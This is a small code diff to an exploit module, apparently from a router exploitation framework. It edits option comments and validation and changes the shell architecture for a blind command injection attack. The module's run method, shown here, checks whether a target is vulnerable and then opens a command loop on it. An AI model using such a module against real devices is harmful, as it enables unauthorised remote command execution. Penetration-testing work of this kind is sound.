@@ -33,15 +33,15 @@ class Exploit(exploits.Exploit):
         ],
     }
 
-    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)
-    port = exploits.Option(80, 'Target port', validators=validators.integer)
+    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
+    port = exploits.Option(80, 'Target port')  # default port
 
     def run(self):
         if self.check():
             print_success("Target appears to be vulnerable")
             print_status("Invoking command loop...")
             print_status("It is blind command injection - response is not available")
-            shell(self, architecture="mipsbe")
+            shell(self, architecture="mips")
         else:
             print_error("Target seems to be not vulnerable")
 
